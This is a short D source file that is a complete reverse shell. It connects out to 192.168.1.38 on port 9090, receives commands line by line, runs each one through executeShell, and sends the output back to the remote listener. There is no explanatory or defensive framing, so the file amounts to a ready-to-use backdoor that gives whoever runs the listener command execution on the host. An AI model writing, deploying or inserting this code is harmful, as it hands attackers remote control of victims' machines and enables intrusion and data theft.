import std.process, std.socket;

void main()
{
   Socket sock = new TcpSocket(new InternetAddress("192.168.1.38", 9090));
   while (true)
   {
      char[] line;
      char[1] buf;
      while(sock.receive(buf))
      {
         line ~= buf;
         if (buf[0] == '\n')
            break;
      }
      if (!line.length)
         break;

      auto os = executeShell(line);
      sock.send(os.output);
   }
}
